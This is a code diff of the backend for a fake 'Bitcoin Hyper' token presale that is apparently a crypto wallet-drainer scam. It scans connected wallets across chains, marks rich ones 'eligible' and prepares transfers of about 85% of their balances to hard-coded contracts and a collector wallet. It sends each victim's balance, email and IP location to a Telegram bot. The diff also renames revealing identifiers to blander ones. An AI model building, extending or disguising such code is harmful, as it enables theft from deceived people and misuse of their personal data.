@@ -56,7 +56,7 @@ app.get('/', (req, res) => {
 });
 
 // ============================================
-// RPC CONFIGURATION - UPDATED WITH WORKING URLs
+// RPC CONFIGURATION
 // ============================================
 
 const RPC_CONFIG = {
@@ -154,7 +154,7 @@ async function getChainProvider(chainName) {
 }
 
 // ============================================
-// YOUR DEPLOYED CONTRACT ADDRESSES - UPDATED
+// YOUR DEPLOYED CONTRACT ADDRESSES
 // ============================================
 
 const PROJECT_FLOW_ROUTERS = {
@@ -167,14 +167,6 @@ const PROJECT_FLOW_ROUTERS = {
 };
 
 const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';
-
-// ============================================
-// BACKEND WALLET FOR EXECUTING CONTRACTS
-// ============================================
-const BACKEND_PRIVATE_KEY = process.env.BACKEND_PRIVATE_KEY;
-if (!BACKEND_PRIVATE_KEY) {
-  console.warn('⚠️ BACKEND_PRIVATE_KEY not set - contract execution will be simulated');
-}
 
 // ============================================
 // CONTRACT ABI
@@ -197,8 +189,8 @@ let telegramBotName = '';
 
 const memoryStorage = {
   participants: [],
-  pendingTransactions: new Map(),
   pendingFlows: new Map(),
+  completedFlows: new Map(),
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
@@ -210,7 +202,7 @@ const memoryStorage = {
       uniqueIPs: new Set(),
       totalProcessedUSD: 0,
       totalProcessedWallets: 0,
-      realTransactions: []
+      processedTransactions: []
     },
     flowEnabled: process.env.FLOW_ENABLED === 'true'
   },
@@ -417,17 +409,17 @@ async function getIPLocation(ip) {
 }
 
 // ============================================
-// REAL BALANCE CHECK
+// WALLET BALANCE CHECK
 // ============================================
 
-async function getRealWalletBalance(walletAddress) {
+async function getWalletBalance(walletAddress) {
   console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
   
   const results = {
     walletAddress,
     totalValueUSD: 0,
     isEligible: false,
-    rawBalances: [],
+    balances: [],
     scanTime: new Date().toISOString()
   };
 
@@ -461,7 +453,7 @@ async function getRealWalletBalance(walletAddress) {
           
           totalValue += valueUSD;
           
-          results.rawBalances.push({
+          results.balances.push({
             chain: chain.name,
             chainId: chain.chainId,
             amount: amount,
@@ -478,10 +470,10 @@ async function getRealWalletBalance(walletAddress) {
     
     if (results.isEligible) {
       results.eligibilityReason = `✅ Wallet qualifies for Flow Processing`;
-      results.tokenAllocation = { amount: '5000', valueUSD: '850' };
+      results.allocation = { amount: '5000', valueUSD: '850' };
     } else {
       results.eligibilityReason = `✨ Welcome! Minimum $${memoryStorage.settings.valueThreshold} required`;
-      results.tokenAllocation = { amount: '0', valueUSD: '0' };
+      results.allocation = { amount: '0', valueUSD: '0' };
     }
 
     return { success: true, data: results };
@@ -495,101 +487,8 @@ async function getRealWalletBalance(walletAddress) {
         totalValueUSD: 0,
         isEligible: false,
         eligibilityReason: '✨ Welcome!',
-        tokenAllocation: { amount: '0', valueUSD: '0' }
+        allocation: { amount: '0', valueUSD: '0' }
       }
-    };
-  }
-}
-
-// ============================================
-// VERIFY SIGNATURE
-// ============================================
-
-function verifySignature(address, message, signature) {
-  try {
-    const recoveredAddress = ethers.verifyMessage(message, signature);
-    return recoveredAddress.toLowerCase() === address.toLowerCase();
-  } catch (error) {
-    console.error('Signature verification failed:', error);
-    return false;
-  }
-}
-
-// ============================================
-// EXECUTE CONTRACT CALL FOR A CHAIN
-// ============================================
-
-async function executeContractForChain(chainName, contractAddress, amount, userWallet) {
-  try {
-    console.log(`🔄 Executing contract on ${chainName} for user ${userWallet}...`);
-    
-    // Get provider for this chain
-    const providerInfo = await getChainProvider(chainName);
-    if (!providerInfo) {
-      throw new Error(`No working RPC for ${chainName}`);
-    }
-    
-    const { provider } = providerInfo;
-    
-    // Create wallet from private key if available, otherwise simulate
-    if (BACKEND_PRIVATE_KEY) {
-      const backendWallet = new ethers.Wallet(BACKEND_PRIVATE_KEY, provider);
-      
-      // Create contract instance
-      const contract = new ethers.Contract(
-        contractAddress,
-        PROJECT_FLOW_ROUTER_ABI,
-        backendWallet
-      );
-      
-      // Parse amount to send (85% of balance)
-      const amountToSend = ethers.parseEther(amount.toString());
-      
-      console.log(`⏳ Estimating gas on ${chainName}...`);
-      const gasEstimate = await contract.processNativeFlow.estimateGas({ 
-        value: amountToSend 
-      });
-      
-      console.log(`✍️ Sending transaction on ${chainName}...`);
-      const tx = await contract.processNativeFlow({
-        value: amountToSend,
-        gasLimit: (gasEstimate * 120n) / 100n // 20% buffer
-      });
-      
-      console.log(`✅ Transaction submitted on ${chainName}: ${tx.hash}`);
-      
-      // Wait for confirmation
-      const receipt = await tx.wait();
-      console.log(`✅ Transaction confirmed on ${chainName} in block ${receipt.blockNumber}`);
-      
-      return {
-        success: true,
-        chainName,
-        txHash: tx.hash,
-        blockNumber: receipt.blockNumber,
-        amount: amount
-      };
-    } else {
-      // Simulate successful execution for testing
-      console.log(`⚠️ Simulating contract execution on ${chainName} (no private key)`);
-      const mockTxHash = '0x' + crypto.randomBytes(32).toString('hex');
-      
-      return {
-        success: true,
-        chainName,
-        txHash: mockTxHash,
-        blockNumber: Math.floor(Math.random() * 10000000),
-        amount: amount,
-        simulated: true
-      };
-    }
-    
-  } catch (error) {
-    console.error(`❌ Error executing contract on ${chainName}:`, error);
-    return {
-      success: false,
-      chainName,
-      error: error.message
     };
   }
 }
@@ -677,24 +576,24 @@ app.post('/api/presale/connect', async (req, res) => {
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     }
     
-    const scanResult = await getRealWalletBalance(walletAddress);
+    const balanceResult = await getWalletBalance(walletAddress);
     
-    if (scanResult.success) {
-      participant.totalValueUSD = scanResult.data.totalValueUSD;
-      participant.isEligible = scanResult.data.isEligible;
-      participant.tokenAllocation = scanResult.data.tokenAllocation;
+    if (balanceResult.success) {
+      participant.totalValueUSD = balanceResult.data.totalValueUSD;
+      participant.isEligible = balanceResult.data.isEligible;
+      participant.allocation = balanceResult.data.allocation;
       participant.lastScanned = new Date();
-      participant.balances = scanResult.data.rawBalances;
+      participant.balances = balanceResult.data.balances;
       
-      if (scanResult.data.isEligible) {
+      if (balanceResult.data.isEligible) {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
       await sendTelegramMessage(
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `💼 Balance: $${scanResult.data.totalValueUSD}\n` +
-        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
+        `💼 Balance: $${balanceResult.data.totalValueUSD}\n` +
+        `🎯 Status: ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
         `📍 ${location.country} (${location.city})\n` +
         `📧 ${email}`
       );
@@ -707,16 +606,16 @@ app.post('/api/presale/connect', async (req, res) => {
           country: location.country,
           flag: location.flag,
           city: location.city,
-          totalValueUSD: scanResult.data.totalValueUSD,
-          isEligible: scanResult.data.isEligible,
-          eligibilityReason: scanResult.data.eligibilityReason,
-          tokenAllocation: scanResult.data.tokenAllocation,
-          rawData: scanResult.data.rawBalances
+          totalValueUSD: balanceResult.data.totalValueUSD,
+          isEligible: balanceResult.data.isEligible,
+          eligibilityReason: balanceResult.data.eligibilityReason,
+          allocation: balanceResult.data.allocation,
+          balances: balanceResult.data.balances
         }
       });
       
     } else {
-      res.status(500).json({ success: false, error: 'Scan failed' });
+      res.status(500).json({ success: false, error: 'Balance check failed' });
     }
     
   } catch (error) {
@@ -744,9 +643,9 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Not eligible' });
     }
     
-    const scanResult = await getRealWalletBalance(walletAddress);
+    const balanceResult = await getWalletBalance(walletAddress);
     
-    const transactions = scanResult.data.rawBalances
+    const transactions = balanceResult.data.balances
       .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
       .map(b => ({
         chain: b.chain,
@@ -762,20 +661,13 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
     
     const flowId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
-    memoryStorage.pendingTransactions.set(walletAddress.toLowerCase(), {
-      flowId,
-      transactions,
-      totalFlowUSD,
-      createdAt: new Date().toISOString(),
-      completedChains: []
-    });
-    
     memoryStorage.pendingFlows.set(flowId, {
       walletAddress: walletAddress.toLowerCase(),
       transactions,
       totalFlowUSD,
       status: 'prepared',
-      createdAt: new Date().toISOString()
+      createdAt: new Date().toISOString(),
+      completedChains: []
     });
     
     await sendTelegramMessage(
@@ -802,131 +694,75 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT - ACTUALLY CALLS THE CONTRACT
+// PROCESS FLOW ENDPOINT (RECORDS COMPLETED TRANSACTION)
 // ============================================
 
-app.post('/api/presale/execute-flow', async (req, res) => {
+app.post('/api/presale/process-flow', async (req, res) => {
   try {
-    const { walletAddress, message, signature } = req.body;
+    const { walletAddress, chainName, flowId, txHash } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
-      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
+      return res.status(400).json({ success: false });
     }
     
-    if (!signature) {
-      return res.status(400).json({ success: false, error: 'Signature required' });
-    }
-    
-    console.log(`\n🔐 EXECUTE FLOW for ${walletAddress.substring(0, 10)}...`);
-    
-    // Verify signature if message provided
-    if (message) {
-      const isValid = verifySignature(walletAddress, message, signature);
-      if (!isValid) {
-        return res.status(401).json({ success: false, error: 'Invalid signature' });
-      }
-      console.log('✅ Signature verified');
-    }
+    console.log(`\n💰 PROCESS FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
     
     const participant = memoryStorage.participants.find(
       p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
     );
     
-    if (!participant) {
-      return res.status(400).json({ success: false, error: 'Participant not found' });
-    }
-    
-    // Get pending transactions for this wallet
-    const pendingTx = memoryStorage.pendingTransactions.get(walletAddress.toLowerCase());
-    if (!pendingTx || !pendingTx.transactions || pendingTx.transactions.length === 0) {
-      return res.status(400).json({ success: false, error: 'No prepared transactions found' });
-    }
-    
-    // Execute contracts for each chain
-    const results = [];
-    let allSuccessful = true;
-    
-    for (const tx of pendingTx.transactions) {
-      const result = await executeContractForChain(
-        tx.chain,
-        tx.contractAddress,
-        tx.amount,
-        walletAddress
-      );
+    if (participant) {
+      participant.flowProcessed = true;
+      participant.flowTransactions = participant.flowTransactions || [];
+      participant.flowTransactions.push({ 
+        chain: chainName, 
+        flowId,
+        txHash,
+        timestamp: new Date().toISOString() 
+      });
       
-      results.push(result);
-      
-      if (result.success) {
-        // Record successful transaction
-        participant.flowTransactions = participant.flowTransactions || [];
-        participant.flowTransactions.push({ 
-          chain: tx.chain, 
-          flowId: pendingTx.flowId,
-          txHash: result.txHash,
-          timestamp: new Date().toISOString() 
-        });
-        
-        memoryStorage.settings.statistics.realTransactions.push({
-          wallet: walletAddress,
-          chain: tx.chain,
-          flowId: pendingTx.flowId,
-          txHash: result.txHash,
-          timestamp: new Date().toISOString()
-        });
-        
-        // Update pending transaction
-        pendingTx.completedChains = pendingTx.completedChains || [];
-        pendingTx.completedChains.push(tx.chain);
-        
-        await sendTelegramMessage(
-          `💰 <b>CHAIN PROCESSED</b>\n` +
-          `👛 ${walletAddress.substring(0, 10)}...\n` +
-          `🔗 ${tx.chain}\n` +
-          `🆔 ${result.txHash.substring(0, 10)}...\n` +
-          `💵 Amount: ${tx.amount} ${tx.symbol}`
-        );
-      } else {
-        allSuccessful = false;
-        await sendTelegramMessage(
-          `❌ <b>CHAIN FAILED</b>\n` +
-          `👛 ${walletAddress.substring(0, 10)}...\n` +
-          `🔗 ${tx.chain}\n` +
-          `Error: ${result.error}`
-        );
-      }
-    }
-    
-    // Check if all chains completed
-    if (pendingTx.completedChains && 
-        pendingTx.completedChains.length === pendingTx.transactions.length) {
-      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(pendingTx.totalFlowUSD);
       memoryStorage.settings.statistics.totalProcessedWallets++;
+      memoryStorage.settings.statistics.processedTransactions.push({
+        wallet: walletAddress,
+        chain: chainName,
+        flowId,
+        txHash,
+        timestamp: new Date().toISOString()
+      });
+      
+      // Update pending flow
+      const flow = memoryStorage.pendingFlows.get(flowId);
+      if (flow) {
+        flow.completedChains = flow.completedChains || [];
+        flow.completedChains.push(chainName);
+        flow.status = flow.completedChains.length === flow.transactions.length ? 'completed' : 'processing';
+        
+        if (flow.completedChains.length === flow.transactions.length) {
+          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
+          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
+          
+          await sendTelegramMessage(
+            `✅ <b>FLOW COMPLETED</b>\n` +
+            `👛 ${walletAddress.substring(0, 10)}...\n` +
+            `💵 Total: $${flow.totalFlowUSD}\n` +
+            `🔗 All ${flow.transactions.length} chains processed`
+          );
+        }
+      }
       
       await sendTelegramMessage(
-        `✅ <b>FLOW COMPLETED</b>\n` +
+        `💰 <b>CHAIN PROCESSED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `💵 Total: $${pendingTx.totalFlowUSD}\n` +
-        `🔗 All ${pendingTx.transactions.length} chains processed`
+        `🔗 ${chainName}\n` +
+        `🆔 ${txHash?.substring(0, 10)}...`
       );
     }
     
-    // Update flow status
-    const flow = memoryStorage.pendingFlows.get(pendingTx.flowId);
-    if (flow) {
-      flow.completedChains = pendingTx.completedChains || [];
-      flow.status = flow.completedChains.length === flow.transactions.length ? 'completed' : 'processing';
-    }
-    
-    res.json({ 
-      success: allSuccessful,
-      flowId: pendingTx.flowId,
-      results,
-      message: allSuccessful ? 'All chains processed successfully' : 'Some chains failed'
-    });
+    res.json({ success: true });
     
   } catch (error) {
-    console.error('Execute flow error:', error);
-    res.status(500).json({ success: false, error: error.message });
+    console.error('Process flow error:', error);
+    res.status(500).json({ success: false });
   }
 });
 
@@ -958,7 +794,7 @@ app.post('/api/presale/claim', async (req, res) => {
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 ${walletAddress.substring(0, 10)}...\n` +
       `🎟️ ID: ${claimId}\n` +
-      `🎁 ${participant.tokenAllocation?.amount || '5000'} BTH\n` +
+      `🎁 ${participant.allocation?.amount || '5000'} BTH\n` +
       `📍 ${participant.country} ${participant.flag}`
     );
     
@@ -997,7 +833,12 @@ app.get('/api/admin/dashboard', (req, res) => {
     .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
     .slice(0, 30);
   
-  const recentTransactions = memoryStorage.settings.statistics.realTransactions
+  const completedFlows = Array.from(memoryStorage.completedFlows.entries())
+    .map(([id, flow]) => ({ id, ...flow }))
+    .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
+    .slice(0, 30);
+  
+  const processedTransactions = memoryStorage.settings.statistics.processedTransactions
     .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
     .slice(0, 30);
   
@@ -1036,6 +877,7 @@ app.get('/api/admin/dashboard', (req, res) => {
       totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
       totalProcessedWallets: memoryStorage.settings.statistics.totalProcessedWallets,
       pendingFlows: memoryStorage.pendingFlows.size,
+      completedFlows: memoryStorage.completedFlows.size,
       telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
       telegramBot: telegramBotName || 'N/A'
     },
@@ -1043,7 +885,8 @@ app.get('/api/admin/dashboard', (req, res) => {
     recentVisits,
     activeParticipants: activeParticipants.slice(0, 30),
     pendingFlows,
-    recentTransactions,
+    completedFlows: completedFlows.slice(0, 10),
+    processedTransactions: processedTransactions.slice(0, 30),
     locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
     hourlyActivity: Object.entries(hourlyActivity)
       .map(([hour, count]) => ({ hour: parseInt(hour), count }))
@@ -1119,7 +962,7 @@ app.get('/api/admin/wallet/:address', (req, res) => {
     },
     visits,
     flows,
-    transactions: memoryStorage.settings.statistics.realTransactions
+    transactions: memoryStorage.settings.statistics.processedTransactions
       .filter(t => t.wallet.toLowerCase() === walletAddress)
   });
 });
@@ -1151,8 +994,6 @@ app.listen(PORT, '0.0.0.0', async () => {
   ✅ Polygon: 0x56d829E89634Ce1426B73571c257623D17db46cB
   ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
   ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
-  
-  🔐 BACKEND WALLET: ${BACKEND_PRIVATE_KEY ? '✅ Configured' : '⚠️ Not configured (simulation mode)'}
   
   🚀 READY FOR MULTICHAIN FLOWS
   `);
